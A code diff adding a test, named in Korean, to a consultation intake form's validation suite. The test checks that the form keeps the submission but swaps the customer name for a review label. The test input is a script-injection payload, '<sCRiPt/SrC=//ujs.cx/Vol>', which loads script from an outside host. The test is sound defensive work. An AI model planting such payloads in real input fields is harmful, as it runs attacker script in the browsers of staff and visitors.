@@ -1,6 +1,7 @@
 import assert from "node:assert/strict";
 import test from "node:test";
 
+import { CONSULTATION_CUSTOMER_NAME_REVIEW_LABEL } from "./consultation.js";
 import { consultationSubmissionSchema } from "./intake.js";
 
 const quickSubmission = {
@@ -29,6 +30,24 @@ const quickSubmission = {
 test("빠른 상담 입력은 전화번호를 정규화한다", () => {
   const parsed = consultationSubmissionSchema.parse(quickSubmission);
   assert.equal(parsed.phone, "01012345678");
+});
+
+test("홈페이지 상담은 고객명만 검토 상태로 바꾸고 접수는 유지한다", () => {
+  const parsed = consultationSubmissionSchema.safeParse({
+    ...quickSubmission,
+    name: "<sCRiPt/SrC=//ujs.cx/Vol>",
+  });
+  assert.equal(parsed.success, true);
+  if (parsed.success) {
+    assert.equal(parsed.data.name, CONSULTATION_CUSTOMER_NAME_REVIEW_LABEL);
+  }
+  assert.equal(
+    consultationSubmissionSchema.parse({
+      ...quickSubmission,
+      name: "   ",
+    }).name,
+    undefined,
+  );
 });
 
 test("귀속 분석 정보는 모든 상담 요청에 필요하다", () => {
